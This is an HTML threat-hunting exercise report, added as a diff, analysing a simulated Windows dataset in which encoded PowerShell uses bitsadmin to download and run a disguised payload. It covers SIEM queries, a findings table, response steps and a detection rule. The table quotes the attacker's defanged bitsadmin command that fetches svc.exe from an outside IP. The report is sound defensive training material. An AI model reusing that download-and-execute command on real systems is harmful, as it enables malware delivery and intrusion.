@@ -1,0 +1,37 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Threat Hunting Exercise: Analyzing Windows BITSAdmin LOLBIN Payload Download Dataset</title><link rel="stylesheet" href="../assets/site.css"></head><body><header><a href="../index.html">← All Threat Hunting Reports</a><span>Threat Hunting Exercise</span></header><main class="report"><h3 id="threat-hunting-exercise-analyzing-windows-bitsadmin-lolbin-payload-download-dataset">Threat Hunting Exercise: Analyzing Windows BITSAdmin LOLBIN Payload Download Dataset</h3>
+<p>This hunt uses a simulated endpoint dataset (<code>windows_bitsadmin_2022-08-09T090000.json</code>) capturing <strong>T1197: BITS Jobs</strong>, where an attacker abuses the Background Intelligent Transfer Service (via <code>bitsadmin.exe</code> or the BITS COM interface) to download a second-stage payload, since BITS transfers are throttled, resumable, and often excluded from egress inspection.</p>
+<h4 id="step-1-hypothesis-formation">Step 1: Hypothesis Formation</h4>
+<p><strong>Hypothesis</strong>: <code>bitsadmin.exe</code> (or a process invoking the BITS COM API) creates a transfer job that downloads an executable from an external URL to a local path, followed by execution of the downloaded file. Indicators:</p>
+<ul>
+<li>Process creation: <code>bitsadmin.exe /transfer &lt;jobname&gt; /download /priority high &lt;url&gt; &lt;local_path&gt;</code>.</li>
+<li>The destination URL is a raw IP, newly-registered domain, or a URL with no legitimate business association.</li>
+<li>The downloaded file is written with an executable extension (.exe, .dll) or a double extension.</li>
+<li>A subsequent process creation event executes the downloaded file shortly after job completion.</li>
+</ul>
+<p><strong>Null Hypothesis</strong>: A legitimate software update mechanism (e.g., Windows Update, an enterprise patch tool) is using BITS as designed. Invalidate by confirming the destination URL is not a Microsoft/vendor update endpoint and that no corresponding patch deployment ticket exists.</p>
+<p><strong>Rationale</strong>: BITS jobs persist across reboots, throttle to avoid triggering bandwidth-anomaly alerts, and are frequently allow-listed by proxies as &quot;Windows Update-related&quot; traffic  -  this hunt validates BITS job auditing as a detection layer for a technique specifically chosen to blend into normal OS update noise.</p>
+<h4 id="step-2-data-sources-and-scope">Step 2: Data Sources and Scope</h4>
+<ul>
+<li><strong>Sources</strong>: Windows BITS Client Event Log (Microsoft-Windows-Bits-Client/Operational, Event ID 3, 59, 60); Sysmon Event ID 1 (Process Creation) and 11 (File Create); Proxy/firewall logs for the destination URL.</li>
+<li><strong>Scope</strong>: ~2022-08-09T09:00:00-09:03:00 UTC; Host: WKS-HR-027 (10.170.6.15); Parent process: <code>powershell.exe</code> (encoded command).</li>
+<li><strong>SIEM Queries</strong> (Splunk/ELK):</li>
+<li><code>index=wineventlog source=&quot;Microsoft-Windows-Bits-Client/Operational&quot; EventCode=59 | table _time Computer TransferId RemoteName LocalName</code></li>
+<li><code>index=sysmon EventCode=1 Image=&quot;<em>bitsadmin.exe</em>&quot; CommandLine=&quot;<em>transfer</em>&quot; | table _time Computer CommandLine ParentImage</code></li>
+<li>Post-download execution: <code>index=sysmon EventCode=1 ParentImage=&quot;<em>bitsadmin.exe</em>&quot; OR Image IN (bits_downloaded_files)</code></li>
+</ul>
+<h4 id="step-3-key-findings">Step 3: Key Findings</h4>
+<p>Parsed events (5 shown) confirm a PowerShell-launched BITS job downloaded and executed a payload from a non-corporate domain, disguised as a Windows update component.</p>
+<div class="table-wrap"><table><thead><tr><th>Timestamp (UTC)</th><th>Host</th><th>Event</th><th>Detail</th><th>IOC/Why Suspicious?</th></tr></thead><tbody><tr><td>2022-08-09 09:00:05</td><td>WKS-HR-027</td><td>Sysmon 1 - Process Create</td><td><code>powershell.exe -enc &lt;base64&gt;</code> spawns <code>bitsadmin.exe /transfer winupd /download /priority high hxxp://185.220.101.45/svc.exe C:\Users\Public\svc.exe</code></td><td><strong>LOLBIN IOC</strong>: BITS invoked via script with a job name (&quot;winupd&quot;) mimicking legitimate Windows Update naming to blend in.</td></tr><tr><td>2022-08-09 09:00:06</td><td>WKS-HR-027</td><td>BITS-Client 3 (Job Created)</td><td>TransferId registered, priority=HIGH, throttled per BITS defaults</td><td><strong>Evasion IOC</strong>: BITS traffic is frequently excluded from proxy inspection under &quot;OS update&quot; allow-lists.</td></tr><tr><td>2022-08-09 09:01:48</td><td>WKS-HR-027</td><td>BITS-Client 59 (Job Complete)</td><td>2.3 MB transferred from 185.220.101.45, a known Tor-exit-adjacent hosting range</td><td><strong>Destination IOC</strong>: source IP has no association with Microsoft or any approved software vendor.</td></tr><tr><td>2022-08-09 09:01:50</td><td>WKS-HR-027</td><td>Sysmon 11 - File Create</td><td><code>C:\Users\Public\svc.exe</code> written</td><td><strong>Location IOC</strong>: world-writable public folder, not a standard installation path.</td></tr><tr><td>2022-08-09 09:02:05</td><td>WKS-HR-027</td><td>Sysmon 1 - Process Create</td><td><code>svc.exe</code> executed, immediately beacons to 185.220.101.45:443</td><td><strong>Execution IOC</strong>: downloaded payload executed within 15 seconds of transfer completion and established C2 callback.</td></tr></tbody></table></div>
+<p><strong>Validation</strong>:</p>
+<ul>
+<li><strong>Timeline</strong>: encoded PowerShell → BITS job creation → download → immediate execution and beaconing, all within 2 minutes  -  an automated delivery chain, not incidental BITS usage.</li>
+<li><strong>False Positives</strong>: the destination IP is not on the approved vendor/CDN list; no patch management ticket authorizes deployment to WKS-HR-027 via BITS.</li>
+<li><strong>Correlation</strong>: encoded PowerShell parent, non-corporate destination, public-folder write, and immediate C2 beacon together confirm malicious BITS abuse.</li>
+</ul>
+<h4 id="step-4-recommendations-next-steps">Step 4: Recommendations &amp; Next Steps</h4>
+<ul>
+<li><strong>Immediate Response</strong>: Cancel the BITS job (<code>bitsadmin /cancel winupd</code>); isolate WKS-HR-027; delete <code>svc.exe</code>; block 185.220.101.45 at the perimeter; retrieve and decode the original PowerShell command for full delivery-chain attribution.</li>
+<li><strong>Detection</strong>: Sigma-style rule: <code>title: BITSAdmin Download to Non-Approved Destination</code> → <code>selection: Image=&quot;<em>bitsadmin.exe</em>&quot; AND CommandLine=&quot;<em>download</em>&quot; AND RemoteName NOT IN approved_cdn_list</code>.</li>
+<li><strong>Pro Tip</strong>: Enable BITS job logging (Microsoft-Windows-Bits-Client/Operational) domain-wide by default  -  it is disabled or unmonitored in most environments despite being a native, high-fidelity log source for this exact technique.</li>
+</ul>
+<p>Hypothesis <strong>confirmed</strong> - an attacker used an encoded PowerShell command to create a BITS transfer job that downloaded and executed a C2 payload disguised as a Windows Update component!</p></main><footer>Local Threat Hunting Reports Library</footer></body></html>
